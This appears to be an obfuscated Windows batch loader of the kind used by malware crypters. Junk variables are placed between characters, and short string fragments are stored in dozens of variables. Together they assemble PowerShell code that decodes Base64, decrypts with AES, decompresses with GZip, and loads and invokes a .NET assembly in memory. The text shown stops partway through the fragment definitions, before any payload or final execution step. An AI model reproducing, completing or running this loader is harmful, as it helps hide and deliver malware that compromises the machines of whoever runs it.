@echo off
%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%s%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%e%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%t%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%l%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%o%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%c%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%a%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%l%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw% %LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%e%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%n%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%a%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%b%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%l%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%e%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%d%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%e%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%l%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%a%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%y%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%e%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%d%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%e%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%x%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%p%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%a%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%n%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%s%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%i%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%o%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%n%LhNBCVltZjHDIFXwSLYrAFaDcSyoNJfXLZnvXhNKZmARdkQKsw%
set "wEQvnWBkUENwMuSyKvIEVdphQMOZjpbGrLechVQbLvrDhQjcrT=s"
set "KQaSJtoIFAiBaEDgebpQrPEHTALLZZCLIpFlGzbLNzqpTkuNaa=t"
set "KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV=!wEQvnWBkUENwMuSyKvIEVdphQMOZjpbGrLechVQbLvrDhQjcrT!e!KQaSJtoIFAiBaEDgebpQrPEHTALLZZCLIpFlGzbLNzqpTkuNaa!"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "IgjypwJiIw='A')"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "rFPXKUqXlQ=4Str"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "PlVzFrhJQr=g.Co"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jZfNFTUpie=ose("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "VgHvvwULSP=Leng"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fmrYtigClS=From"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "VjnSnYJpcW=s]::"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "shsPXHLzpm=//ra"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "IYqBjRCzhx=
 | "
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "lzCUgzGSme=Crea"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oYqtMwoxjC=teDe"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fomGqceyKw=Entr"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "LRlUVxyqPJ= $b1"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "KXtTcTwkoD=Conv"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "UJxgYYbIMg=Disp"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "gqRHWZEmWR=-Obj"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "NhYgOWoEis=V=$i"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tZSaaAHSkb=ng)."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wjEmCFaCdg=m;$g"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FHlSJBDNKo=sicP"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "pcLvuDFYlO=.Com"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TTXRYYJKWV=$a.I"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "WoFieTkNHb=-dev"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "hczLPtmVpT=oryS"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "RhyfFhXtDz=sion"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iLlsETGaET=z(d("
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "HMogoLGBsk=','/"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "cDHXRuWQwf=';$a"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "wopcGkavTV=V');"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "RxdiltzMKk==$a."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "UYhDhEasXi=SE64"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "lXAPDWmkAb=Base"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jcRTZYUskL=2\Wi"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "RTilAEEcSR=yPoi"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "XrntlZflTM=();$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "RvVicrFBeM=bly]"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "dhjBTFgUyh=($b)"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "glDQXzPTgI='@',"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "WmfJCGFPhu=iv=["
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "CZcDCFocKq=vate"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "TNcbuYedCD=\Sys"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "sKgVAttgWa=ep=$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "dLSRkXEeyU=ell\"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "OaofnfxCXo=asm."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "MuCyjafIXY=;$a."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "kNQwWBOLKM=C';$"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GqTxczjbyT=);$i"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "xORiChEXey=Mode"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ljeDEnjeWX=pose"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fiDrJzizPe=$b);"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "OXdZByHAHn=\Win"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "kMyZVKUrZK=tem3"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "dLDPgXfnoy=seBa"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "DgHJXBQfLR=ert]"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oKhvWjSxdG=arsi"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "tsAGRNpOTp=ncti"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "nHXPbwVujp= e($"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JlTeOIqdMx=plac"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oyFMtMmNzf=bjec"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "uurswXllIn=on.A"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FQbvnRWicw=erSh"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "oaUDOZNClm=alBl"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "DQwznPGHHN=[Con"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "rPgXgCmMfK=\pow"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fIjHeGOlSj=Trim"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "DqzwhtmhBN=t IO"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "FAXGjFeFYr=trea"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "PLtTZTgKvP=);$r"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "syeidxZkqY=ptog"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "RSHJFcpFrK=$o=N"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "JbnqrRzEXC=ssem"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iBHryMdEfH=ell."
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "sSJAQzlIPq=pres"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "fHqgZyLQPs=($o)"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iqNWAaetAQ=Base"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GKeeydQowV=,[IO"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iGqQAVCtJv=;$b1"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "GVNSxpsLye=]::D"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "mxEJjUkzQT=.Key"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "vZPdRcCakG=vert"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "jsLiJyxiXo=y.Ae"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "BswQxHfCwz=('BA"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "aNFmlyprUZ=essi"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "iyBKRqrcEn=@([o"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "CmSnygdUeV=raph"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "ldMjOmiZMm=Obje"
!KnCiinSyLOVhyeBICTqiXGcynIRQZfXsSaayasJOxKpniLbTyV! "QCfmgRsdqR=trea"
